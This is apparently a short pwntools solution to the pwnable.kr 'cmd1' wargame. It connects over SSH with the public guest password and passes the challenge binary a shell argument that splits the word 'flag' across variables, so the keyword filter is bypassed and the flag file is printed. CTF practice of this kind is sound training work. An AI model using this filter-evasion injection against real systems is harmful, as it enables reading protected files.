from pwn import *

s = ssh('cmd1', 'pwnable.kr', port=2222, password='guest')

# p = s.process(["./cmd1", '''str1="fl"
# str2="ag"
# while read line; do
#     echo "$line"
# done < $str1$str2'''])

p = s.process(["./cmd1", '''str1="fl"
str2="ag"
/bin/cat $str1$str2'''])

print(p.recvall().decode())